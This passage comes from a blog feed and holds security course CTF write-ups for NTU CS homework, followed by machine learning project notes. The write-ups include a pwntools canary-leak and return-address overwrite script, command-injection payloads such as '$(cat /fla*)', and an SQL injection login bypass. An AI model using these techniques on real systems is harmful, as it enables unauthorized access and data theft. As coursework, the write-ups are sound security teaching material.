&lt;li>接著就是在&lt;code>Option/String literals&lt;/code>視窗中設定用哪一個型態表示字串，這邊因為每一個字元都是4 bytes，也就是32 bits，所以選擇C-style
&lt;img src="https://hackmd.io/_uploads/SyQBP8Zfp.png" alt="" />
:::spoiler 完整流程&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 unk_2008 db 46h ; F ; DATA XREF: main+8↑o
.rodata:0000000000002009 db 0
.rodata:000000000000200A db 0
.rodata:000000000000200B db 0
.rodata:000000000000200C db 4Ch ; L
.rodata:000000000000200D db 0
.rodata:000000000000200E db 0
.rodata:000000000000200F db 0
.rodata:0000000000002010 db 41h ; A
.rodata:0000000000002011 db 0
.rodata:0000000000002012 db 0
.rodata:0000000000002013 db 0
.rodata:0000000000002014 db 47h ; G
.rodata:0000000000002015 db 0
.rodata:0000000000002016 db 0
.rodata:0000000000002017 db 0
.rodata:0000000000002018 db 7Bh ; {
.rodata:0000000000002019 db 0
.rodata:000000000000201A db 0
.rodata:000000000000201B db 0
.rodata:000000000000201C db 68h ; h
.rodata:000000000000201D db 0
.rodata:000000000000201E db 0
.rodata:000000000000201F db 0
.rodata:0000000000002020 db 33h ; 3
.rodata:0000000000002021 db 0
.rodata:0000000000002022 db 0
.rodata:0000000000002023 db 0
.rodata:0000000000002024 db 31h ; 1
.rodata:0000000000002025 db 0
.rodata:0000000000002026 db 0
.rodata:0000000000002027 db 0
.rodata:0000000000002028 db 31h ; 1
.rodata:0000000000002029 db 0
.rodata:000000000000202A db 0
.rodata:000000000000202B db 0
.rodata:000000000000202C db 4Fh ; O
.rodata:000000000000202D db 0
.rodata:000000000000202E db 0
.rodata:000000000000202F db 0
.rodata:0000000000002030 db 5Fh ; _
.rodata:0000000000002031 db 0
.rodata:0000000000002032 db 0
.rodata:0000000000002033 db 0
.rodata:0000000000002034 db 72h ; r
.rodata:0000000000002035 db 0
.rodata:0000000000002036 db 0
.rodata:0000000000002037 db 0
.rodata:0000000000002038 db 65h ; e
.rodata:0000000000002039 db 0
.rodata:000000000000203A db 0
.rodata:000000000000203B db 0
.rodata:000000000000203C db 76h ; v
.rodata:000000000000203D db 0
.rodata:000000000000203E db 0
.rodata:000000000000203F db 0
.rodata:0000000000002040 db 65h ; e
.rodata:0000000000002041 db 0
.rodata:0000000000002042 db 0
.rodata:0000000000002043 db 0
.rodata:0000000000002044 db 72h ; r
.rodata:0000000000002045 db 0
.rodata:0000000000002046 db 0
.rodata:0000000000002047 db 0
.rodata:0000000000002048 db 73h ; s
.rodata:0000000000002049 db 0
.rodata:000000000000204A db 0
.rodata:000000000000204B db 0
.rodata:000000000000204C db 31h ; 1
.rodata:000000000000204D db 0
.rodata:000000000000204E db 0
.rodata:000000000000204F db 0
.rodata:0000000000002050 db 6Eh ; n
.rodata:0000000000002051 db 0
.rodata:0000000000002052 db 0
.rodata:0000000000002053 db 0
.rodata:0000000000002054 db 67h ; g
.rodata:0000000000002055 db 0
.rodata:0000000000002056 db 0
.rodata:0000000000002057 db 0
.rodata:0000000000002058 db 5Fh ; _
.rodata:0000000000002059 db 0
.rodata:000000000000205A db 0
.rodata:000000000000205B db 0
.rodata:000000000000205C db 33h ; 3
.rodata:000000000000205D db 0
.rodata:000000000000205E db 0
.rodata:000000000000205F db 0
.rodata:0000000000002060 db 6Eh ; n
.rodata:0000000000002061 db 0
.rodata:0000000000002062 db 0
.rodata:0000000000002063 db 0
.rodata:0000000000002064 db 67h ; g
.rodata:0000000000002065 db 0
.rodata:0000000000002066 db 0
.rodata:0000000000002067 db 0
.rodata:0000000000002068 db 69h ; i
.rodata:0000000000002069 db 0
.rodata:000000000000206A db 0
.rodata:000000000000206B db 0
.rodata:000000000000206C db 6Eh ; n
.rodata:000000000000206D db 0
.rodata:000000000000206E db 0
.rodata:000000000000206F db 0
.rodata:0000000000002070 db 65h ; e
.rodata:0000000000002071 db 0
.rodata:0000000000002072 db 0
.rodata:0000000000002073 db 0
.rodata:0000000000002074 db 65h ; e
.rodata:0000000000002075 db 0
.rodata:0000000000002076 db 0
.rodata:0000000000002077 db 0
.rodata:0000000000002078 db 72h ; r
.rodata:0000000000002079 db 0
.rodata:000000000000207A db 0
.rodata:000000000000207B db 0
.rodata:000000000000207C db 35h ; 5
.rodata:000000000000207D db 0
.rodata:000000000000207E db 0
.rodata:000000000000207F db 0
.rodata:0000000000002080 db 7Dh ; }
.rodata:0000000000002081 db 0
.rodata:0000000000002082 db 0
.rodata:0000000000002083 db 0
.rodata:0000000000002084 db 0
.rodata:0000000000002085 db 0
.rodata:0000000000002086 db 0
.rodata:0000000000002087 db 0
&lt;/code>&lt;/pre>&lt;p>$\downarrow$&lt;/p></description></item><item><title>NTU CS 2023 HW3 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/pwn/ntu-cs-2023-hw3-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw3-write-up">
 NTU CS 2023 HW3 Write Up
 &lt;a class="anchor" href="#ntu-cs-2023-hw3-write-up">#&lt;/a>
&lt;/h1>
&lt;h2 id="lab-stackoverflow">
 Lab-Stackoverflow
 &lt;a class="anchor" href="#lab-stackoverflow">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>flag{Y0u_know_hoW2L3@k_canAry}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;p>這一題就是前一年的&lt;a href="https://hackmd.io/@SBK6401/BJijt4A9s">Leak Canary&lt;/a>的應用版，當時是用pwndbg，還不知道gef的偉大，總之這一題的思路就是:&lt;/p>
&lt;ol>
&lt;li>接收開shell的function的address(win function)&lt;/li>
&lt;li>接收0x20個bytes，分別代表RSP value/Stack Canary/RBP value/RIP&lt;/li>
&lt;li>傳送payload過去，分別是&lt;code>p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr)&lt;/code>&lt;/li>
&lt;li>這樣就可以蓋到RIP後又不會被偵測到canary被改變，return之後拿到shell&lt;/li>
&lt;/ol>
&lt;p>:::info
比較值得注意的是，因為我是在公布解答前先自己寫，遇到了return之後拿不到shell的問題，後來經過助教的解釋才知道原來是，開shell的過程中&lt;code>&amp;lt;do_system+115&amp;gt; movaps XMMWORD PTR [rsp], xmm1&lt;/code>，RSP必須要是對齊的狀態，也就是最後應該要是0，但可以看下圖，如果直接跳到win function的開頭，rsp就不是0，會偏移8 bytes，所以會出現SIGSEGV
&lt;img src="https://hackmd.io/_uploads/rJK-2d0ma.png" alt="圖片" />&lt;/p>
&lt;p>解決方式有兩個，一個是少push一次，一個是多pop一次，這樣就可以校正RSP回到0結尾的狀態，所以我們才要在RIP的地方加上(0xf1-0xe9)的offset，讓RIP可以少push一次，這樣就可以解決問題
&lt;img src="https://hackmd.io/_uploads/ByhF2OCQa.png" alt="圖片" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/SyxvoO0Xa.png" alt="圖片" />
:::&lt;/p>
&lt;h3 id="exploit---leak-canary--control-rip">
 Exploit - Leak Canary + Control RIP
 &lt;a class="anchor" href="#exploit---leak-canary--control-rip">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from pwn import *

# r = process(&amp;#39;./lab&amp;#39;)
r = remote(&amp;#39;10.113.184.121&amp;#39;, 10041)

r.recvuntil(b&amp;#39;Gift: 0x&amp;#39;)
win_addr = int(r.recvline().strip(), 16) + (0xf1 - 0xe9)
r.recvuntil(b&amp;#39;Gift2: &amp;#39;)
rsp_val = u64(r.recv(0x8))
stack_canary = u64(r.recv(0x8))
rbp_val = u64(r.recv(0x8))
rip = u64(r.recv(0x8))

log.info(f&amp;#39;win address = {hex(win_addr)}&amp;#39;)
log.info(f&amp;#39;RSP value = {hex(rsp_val)}&amp;#39;)
log.info(f&amp;#39;Stack Canary = {hex(stack_canary)}&amp;#39;)
log.info(f&amp;#39;RBP value = {hex(rbp_val)}&amp;#39;)
log.info(f&amp;#39;RIP value = {hex(rip)}&amp;#39;)

payload = p64(rsp_val) + p64(stack_canary) + p64(rbp_val) + p64(win_addr)
log.info(f&amp;#39;Payload = {payload}&amp;#39;)
# raw_input()
r.sendline(payload)

r.interactive()
&lt;/code>&lt;/pre>&lt;h2 id="lab-shellcode">
 Lab-Shellcode
 &lt;a class="anchor" href="#lab-shellcode">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>flag{How_you_do0o0o0o_sysca1111111}&lt;/code>&lt;/p></description></item><item><title>NTU CS 2023 HW4 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/ntu-cs-2023-hw4-write-up/</guid><description>&lt;h1 id="ntu-cs-2023-hw4-write-up">
 NTU CS 2023 HW4 Write Up
 &lt;a class="anchor" href="#ntu-cs-2023-hw4-write-up">#&lt;/a>
&lt;/h1>
&lt;h2 id="lab-cat-shop">
 Lab-Cat Shop
 &lt;a class="anchor" href="#lab-cat-shop">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>這一題很簡單，只要觀察送出的封包就可以知道每一個品項都是按照順序的(可預期的號碼)，所以只要把品項改成我們要的就可以成功query，如下圖，原本FLAG的column反白無法點選
&lt;img src="https://hackmd.io/_uploads/SJ3bD8x_T.png" alt="圖片" />
但因為送出的item number可預期，所以還是能夠正常query
&lt;img src="https://hackmd.io/_uploads/HJ6yDUe_a.png" alt="圖片" />&lt;/li>
&lt;li>接著看下一個packet就知道連我們的餘額以及支付金額都是裸奔的狀態，所以可以直接更改拿到flag
&lt;img src="https://hackmd.io/_uploads/Sko9wLldp.png" alt="圖片" />
&lt;img src="https://hackmd.io/_uploads/S1CovLldp.png" alt="圖片" />&lt;/li>
&lt;/ol>
&lt;h2 id="lab-dns-lookuper">
 Lab-DNS Lookuper
 &lt;a class="anchor" href="#lab-dns-lookuper">#&lt;/a>
&lt;/h2>
&lt;p>Flag: FLAG{Y0U_$(Byp4ssed)_th3_`waf`}&lt;/p>
&lt;h3 id="解題流程與思路-1">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-1">#&lt;/a>
&lt;/h3>
&lt;p>Use &lt;font color="FF0000">&lt;strong>&lt;code>$&lt;/code>&lt;/strong> or &lt;strong>`&lt;/strong>&lt;/font> string to bypass blacklist
Payload:
&lt;code>'$(cat /fla*)'&lt;/code>
&lt;code>'&lt;/code>cat /fl*g*&lt;code>'&lt;/code>&lt;/p>
&lt;h2 id="lab-log-me-in">
 Lab-Log me in
 &lt;a class="anchor" href="#lab-log-me-in">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{b4by_sql_inj3cti0n}&lt;/code>&lt;/p>
&lt;h3 id="解題流程與思路-2">
 解題流程與思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%b5%81%e7%a8%8b%e8%88%87%e6%80%9d%e8%b7%af-2">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Payload → &lt;code>') or ('1'='1') -- #&lt;/code>
SELECT * FROM admin WHERE (username=&amp;rsquo;&amp;rsquo;) or (&amp;lsquo;1&amp;rsquo;=&amp;lsquo;1&amp;rsquo;) &amp;ndash; #&amp;rsquo;) AND (password=&amp;lsquo;MTIz&amp;rsquo;)&lt;/li>
&lt;/ul>
&lt;h2 id="lab-jinja2-ssti">
 Lab-Jinja2 SSTI
 &lt;a class="anchor" href="#lab-jinja2-ssti">#&lt;/a>
&lt;/h2>
&lt;p>Flag: &lt;code>FLAG{ssti.__class__.__pwn__}&lt;/code>&lt;/p></description></item><item><title>NTU CS HW0 Write Up</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/welcome/ntu-cs-hw0-write-up/</guid><description>&lt;h1 id="ntu-cs-hw0-write-up">
 NTU CS HW0 Write Up
 &lt;a class="anchor" href="#ntu-cs-hw0-write-up">#&lt;/a>
&lt;/h1>
&lt;p>:::spoiler TOC
[TOC]
:::&lt;/p>
&lt;h2 id="easy-c2">
 Easy C2
 &lt;a class="anchor" href="#easy-c2">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Flag: &lt;code>FLAG{C2_cmd_in_http_header}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h3>
&lt;p>我們獵捕到一隻惡意程式，它似乎有與 C2 進行互動的行為。請找出它發送給 C2 的訊息。Flag 格式為：FLAG{&amp;hellip;}。
此題模仿惡意程式與 C2 進行溝通的行為，期望能在對不熟悉逆向的同學而言不過度困難的情況下，讓同學對惡意程式行為有初步的認識。題目本身並沒有實際的惡意或影響系統運作的行為，因此可以安心執行。建議同學可以先嘗試執行程式，觀察程式的行為，嘗試找出 C2 位址以及如何與其溝通。&lt;/p>
&lt;p>Google 關鍵字：IDA freeware、Ghidra、malware C2&lt;/p>
&lt;h3 id="解題思路">
 解題思路
 &lt;a class="anchor" href="#%e8%a7%a3%e9%a1%8c%e6%80%9d%e8%b7%af">#&lt;/a>
&lt;/h3>
&lt;ol>
&lt;li>Simple 解題思路
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ file easy-c2
easy-c2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8fa6ee42a706cfc93d97d04b3ff5e300b9f8ae02, for GNU/Linux 3.2.0, with debug_info, not stripped
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>IDA
&lt;pre tabindex="0">&lt;code class="language-cpp!" data-lang="cpp!">int __cdecl main(int argc, const char **argv, const char **envp)
{
 int sockfd; // [rsp+1Ch] [rbp-24h]
 char *flag; // [rsp+20h] [rbp-20h] BYREF
 char *enc_flag; // [rsp+28h] [rbp-18h]
 char *host; // [rsp+30h] [rbp-10h]
 unsigned __int64 v8; // [rsp+38h] [rbp-8h]

 v8 = __readfsqword(0x28u);
 enc_flag = byte_20F0;
 host = &amp;#34;127.0.0.1&amp;#34;;
 sockfd = socket_connect(&amp;#34;127.0.0.1&amp;#34;, 11187);
 decode_flag(&amp;amp;flag, byte_20F0);
 send_msg(sockfd, flag);
 puts(&amp;#34;Message sent.&amp;#34;);
 sleep(1u);
 free(flag);
 close(sockfd);
 return 0;
}
&lt;/code>&lt;/pre>可以看得出來他會連localhost:11187，然後把decode過後的flag給送出去，所以只要會nc的都可以直接聽該port的訊息&lt;/li>
&lt;/ol>
&lt;h3 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h3>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ nc -lvp 11187
Listening on 0.0.0.0 11187
Connection received on localhost 54028
GET / HTTP/1.0
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko, FLAG{C2_cmd_in_http_header}) Chrome/51.0.2704.103 Safari/537.36
&lt;/code>&lt;/pre>&lt;h2 id="baby-crackme">
 Baby Crackme
 &lt;a class="anchor" href="#baby-crackme">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>Flag: &lt;code>FLAG{r0ll1ng_4nd_3xtr4ct_t0_m3m0ry}&lt;/code>&lt;/li>
&lt;/ul>
&lt;h3 id="description-1">
 Description
 &lt;a class="anchor" href="#description-1">#&lt;/a>
&lt;/h3>
&lt;p>透過此題目希望學生們可以先自行摸索過各種 SRE(Software Reverse-Engineering) 的工具與流程。 給你一些關鍵字用: IDA Freeware, Ghidra, gdb (GNU Debugger), Dynamic Analysis&lt;/p></description></item><item><title>NTU Machine Learning Final Project Proposal Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes-1/</guid><description>&lt;h1 id="ntu-machine-learning-final-project-proposal-notes">
 NTU Machine Learning Final Project Proposal Notes
 &lt;a class="anchor" href="#ntu-machine-learning-final-project-proposal-notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ml-machine-learning">
 tags: &lt;code>NTU_ML&lt;/code> &lt;code>Machine Learning&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ml-machine-learning">#&lt;/a>
&lt;/h6>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Paper&lt;/th>
 &lt;th style="text-align: left">Used Technique / Ingenuity&lt;/th>
 &lt;th style="text-align: left">Suitable / Unsuitable Reason&lt;/th>
 &lt;th style="text-align: center">Replace to&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">[1]&lt;/td>
 &lt;td style="text-align: left">Models overview&lt;br>&lt;li>3D maps of gray and/or white matter (deep learning models: six layer CNN, ResNet, and Inception V1)&lt;/li>&lt;li>vertex wise measurements from the surface-based processing (models BLUP and SVM)&lt;/li>&lt;br />Model 1: Best Linear Unbiased Predictor(BLUP)&lt;/br>Model 2: Support Vector Regression&lt;/br>Model 3: Six-Layer Convolutional Neural Networks&lt;/br>Model 4: Specialized Six-Layer Convolutional Neural Networks for Younger and Older Subjects&lt;/br>Model 5: ResNet&lt;/br>Model 6: Inception V1&lt;/br>&lt;/br> Additional Experiments&lt;li>Different Types of Model Combination: Linear Regression vs. Random Forest&lt;/li>&lt;li>Combining Seven (Identical) Convolutional Neural Networks or the Seven Best Epochs&lt;/li>&lt;li>Influence of the Type of Brain Features on Prediction Accuracy&lt;/li>&lt;/td>
 &lt;td style="text-align: left">Suitable:&lt;/br>In this field, it&amp;rsquo;s very clearly on comparing 6 variety models which can help us to know the implementation what we learned in class.&lt;/br>Also can aware of the result between high level model and custom level model&lt;/br>&lt;/br>For linear regression and random forest, they trained the &lt;strong>ensemble algorithms&lt;/strong> on a random subset. They repeated this process 500 times to get a bootstrap estimate of the SE of the MAE.&lt;/td>
 &lt;td style="text-align: center">N/A&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">[2]&lt;/td>
 &lt;td style="text-align: left">2D and 3D-CNN on age estimation&lt;li>For 2D-CNN, we consider the features as an image of size 168×60 (DH×M) ignoring the days as temporal information.&lt;/li>&lt;li>However, for 3D-CNN, we consider the features as a 3D volume with temporal information across the days, where each day has 24 hours and an hour is 60 minutes. So to break it down, we represent the features as a three dimensional information of 7×24×60 (D×H×M) minutes.&lt;/li>&lt;/td>
 &lt;td style="text-align: left">Unsuitable:&lt;/br> Though the topic is interesting, the technique content is less then expectation and the .&lt;/td>
 &lt;td style="text-align: center">No Idea Yet&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">[3]&lt;/td>
 &lt;td style="text-align: left">Model for classification:&lt;/br>Random Forest, GLMNet, SVM(including e1071, which is a package of LibSVM in R language, LiblinearR, kernlab, Rgtsvm), and xgboost&lt;/br>&lt;/br>Calibration Algorithm(i.e. post-processing):logistic regression(GLM function), BRGLM, GLMNet&lt;/br>&lt;/br>Performance evaluation: HandTill2001&lt;/td>
 &lt;td style="text-align: left">Suitable:&lt;/br>The reason is as the same as [1] which also used various methods and compare it to other papers detailed.&lt;/td>
 &lt;td style="text-align: center">N/A&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="appendix">
 Appendix
 &lt;a class="anchor" href="#appendix">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>The custom model in &lt;font color=Red>[1]&lt;/font>
&lt;img src="https://imgur.com/JXPDeLS.png" alt="proposed six-layer CNN" />&lt;/p></description></item><item><title>NTU Machine Learning Final Project Proposal Notes</title><link>https://bernie6401.github.io/docs/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ml/ntu-machine-learning-final-project-proposal-notes/</guid><description>&lt;h1 id="ntu-machine-learning-final-project-proposal-notes">
 NTU Machine Learning Final Project Proposal Notes
 &lt;a class="anchor" href="#ntu-machine-learning-final-project-proposal-notes">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ml-machine-learning">
 tags: &lt;code>NTU_ML&lt;/code> &lt;code>Machine Learning&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ml-machine-learning">#&lt;/a>
&lt;/h6>
&lt;h2 id="deep6mapred-a-cnn-and-bi-lstm-based-deep-learning-method-for-predicting-dna-n6-methyladenosine-sites-across-plant-species">
 Deep6mAPred: A CNN and Bi-LSTM-based deep learning method for predicting DNA N6-methyladenosine sites across plant species
 &lt;a class="anchor" href="#deep6mapred-a-cnn-and-bi-lstm-based-deep-learning-method-for-predicting-dna-n6-methyladenosine-sites-across-plant-species">#&lt;/a>
&lt;/h2>
&lt;h3 id="introduction--motivation">
 Introduction &amp;amp; Motivation
 &lt;a class="anchor" href="#introduction--motivation">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>DNA methylation alters activities of DNA segments without changing the sequence, which thus yields a wide variety of roles in the cellular processes across organisms or tissues&lt;/li>
&lt;li>DNA methylation is widely distributed both in prokaryote and in eukaryote, but the proportion of methylated residues differs greatly with species&lt;/li>
&lt;li>DNA methylation is essential for normal development&lt;/li>
&lt;li>DNA methylation is increasingly attracting attentions from biologists&lt;/li>
&lt;/ul>
&lt;h3 id="related-works">
 Related works
 &lt;a class="anchor" href="#related-works">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>Even Luo et al.[41] - proposed the DNA 6mA as a new epigenetic mark in eukaryotes&lt;/p></description></item><item><title>NTU Machine Learning Homework 1</title><link>https://bernie6401.github.io/docs/security/course/ntu-ml/ntu-machine-learning-homework-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-ml/ntu-machine-learning-homework-1/</guid><description>&lt;h1 id="ntu-machine-learning-homework-1">
 NTU Machine Learning Homework 1
 &lt;a class="anchor" href="#ntu-machine-learning-homework-1">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntu_ml-machine-learning">
 tags: &lt;code>NTU_ML&lt;/code> &lt;code>Machine Learning&lt;/code>
 &lt;a class="anchor" href="#tags-ntu_ml-machine-learning">#&lt;/a>
&lt;/h6>
&lt;h2 id="how-to-choose-features-of-data">
 How to choose features of data
 &lt;a class="anchor" href="#how-to-choose-features-of-data">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>After observing the training data visualized image, you can be aware of the relationship between the PM2.5 feature and the others.&lt;/li>
&lt;li>For instance, the CO image, NO image, NO2 image, and NOx image are much more correlated with PM2.5.
&lt;img src="https://imgur.com/73t0b9Q.png" alt="co" />&lt;img src="https://imgur.com/tSGtNe9.png" alt="no" />&lt;img src="https://imgur.com/IobYzpN.png" alt="no2" />&lt;img src="https://imgur.com/vyz8COx.png" alt="nox" />&lt;img src="https://imgur.com/acbWSvK.png" alt="pm2.5" />&lt;/li>
&lt;li>I also choose PM10, WS_HR, RAINFALL, RH, WIND_SPEED, and PM2.5 which you can see &lt;a href="https://bernie6401.github.io/HW1/Programming/train_data_img/">here&lt;/a>&lt;/li>
&lt;li>I used Zscore normalization to implement in my project and can see as below&lt;img src="https://imgur.com/BTmhmRm.png" alt="zscore_CO" />&lt;img src="https://imgur.com/7mz2uHW.png" alt="zscore_NO" />&lt;img src="https://imgur.com/NiF1vxl.png" alt="zscore_NO2" />&lt;img src="https://imgur.com/gW6xij3.png" alt="zscore_NOx" />&lt;/li>
&lt;li>You can see the different result of using or unusing normalization with the same config.
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Epoch&lt;/th>
 &lt;th style="text-align: center">Regression&lt;/th>
 &lt;th>LR&lt;/th>
 &lt;th style="text-align: center">Feats&lt;/th>
 &lt;th style="text-align: center">Batch Size&lt;/th>
 &lt;th style="text-align: center">Loss Fn.&lt;/th>
 &lt;th style="text-align: center">Opti.&lt;/th>
 &lt;th style="text-align: center">RMSE&lt;/th>
 &lt;th style="text-align: center">Data Filter&lt;/th>
 &lt;th style="text-align: center">Norm. Data&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td style="text-align: center">200&lt;/td>
 &lt;td style="text-align: center">1st-order&lt;/td>
 &lt;td>0.015&lt;/td>
 &lt;td style="text-align: center">[1-4, 6-9, 13, 14]&lt;/td>
 &lt;td style="text-align: center">1024&lt;/td>
 &lt;td style="text-align: center">MSE&lt;/td>
 &lt;td style="text-align: center">Adam&lt;/td>
 &lt;td style="text-align: center">2.44623&lt;/td>
 &lt;td style="text-align: center">Yes&lt;/td>
 &lt;td style="text-align: center">Yes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td style="text-align: center">200&lt;/td>
 &lt;td style="text-align: center">1st-order&lt;/td>
 &lt;td>0.015&lt;/td>
 &lt;td style="text-align: center">[1-4, 6-9, 13, 14]&lt;/td>
 &lt;td style="text-align: center">1024&lt;/td>
 &lt;td style="text-align: center">MSE&lt;/td>
 &lt;td style="text-align: center">Adam&lt;/td>
 &lt;td style="text-align: center">2.44623&lt;/td>
 &lt;td style="text-align: center">Yes&lt;/td>
 &lt;td style="text-align: center">No&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;/li>
&lt;/ul>
&lt;h2 id="hyperparameter-and-preprocessing">
 Hyperparameter and Preprocessing
 &lt;a class="anchor" href="#hyperparameter-and-preprocessing">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>All my testing config can be found in Training Result.xlsx&lt;/li>
&lt;li>I used a filter to choose valid data and set a threshold by observing the visualized figure of all features.&lt;/li>
&lt;/ul>
&lt;h2 id="my-takeaway">
 My takeaway
 &lt;a class="anchor" href="#my-takeaway">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>**(Solved-&amp;gt;See the last paragraph)**Using normalization is not like what I thought. Practically speaking, using normalization can gather all data to a specific area that the model can converge much more rapidly. But, in this case, the result is worse and also appear negative value of the PM2.5 result. According to &lt;a href="https://blog.csdn.net/u010947534/article/details/86632819?spm=1001.2014.3001.5506">this page&lt;/a>, maybe the normalization method is not suitable in my case.&lt;/li>
&lt;li>**(Solved-&amp;gt;See the last paragraph)**I also figured that using the stored weight and bias by my pretrained model is not the right way. I used pickle to store the dump parameters during the training and used the best one as my pretrained parameter. But it&amp;rsquo;s still not that good enough.&lt;/li>
&lt;li>The better way in this project to enhance your accuracy is tuning your training config and select good features.&lt;/li>
&lt;li>After discussing with my friend, I figured out the problem and tried to solve it successfully by fitting numpy random seed. Then, the parameter will truly fix but normalization &lt;strong>is still not working&lt;/strong> to help model converging.&lt;/li>
&lt;/ul>
&lt;h2 id="update">
 Update
 &lt;a class="anchor" href="#update">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>2022/12/06 update - Refer to &lt;a href="https://www.youtube.com/watch?v=z-21v0EoFh4&amp;amp;ab_channel=CUSTCourses">相關&lt;/a> taught by Dr.李柏堅, I use &lt;code>Pearson Correlation&lt;/code> to compute the correlation of each factor and PM2.5 and the result is shown as below. According to the &lt;a href="https://www.youtube.com/watch?v=z-21v0EoFh4&amp;amp;ab_channel=CUSTCourses">video&lt;/a>, &lt;code>|r| &amp;lt; 0.4&lt;/code> is low correlation, &lt;code>0.4 ≦ |r| &amp;lt; 0.7&lt;/code>is medium correlation, and &lt;code>0.7 ≦ |r| &amp;lt; 1&lt;/code> is high correlation. So, the factor &lt;strong>&lt;font color=#FF0000>&lt;/strong>&lt;code>CO&lt;/code>, &lt;code>NO&lt;/code>, &lt;code>NO2&lt;/code>, &lt;code>NOx&lt;/code>, &lt;code>PM10&lt;/code>, and &lt;code>SO2&lt;/code>&lt;strong>&lt;/font>&lt;/strong> are quite suitable as our input data to address this regression problem.
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th style="text-align: center">Factor&lt;/th>
 &lt;th style="text-align: center">AMB_TEMP&lt;/th>
 &lt;th style="text-align: center">CO&lt;/th>
 &lt;th style="text-align: center">NO&lt;/th>
 &lt;th style="text-align: center">NO2&lt;/th>
 &lt;th style="text-align: center">NOx&lt;/th>
 &lt;th style="text-align: left">O3&lt;/th>
 &lt;th style="text-align: left">PM10&lt;/th>
 &lt;th style="text-align: center">WS_HR&lt;/th>
 &lt;th style="text-align: center">RAINFALL&lt;/th>
 &lt;th style="text-align: center">RH&lt;/th>
 &lt;th style="text-align: center">SO2&lt;/th>
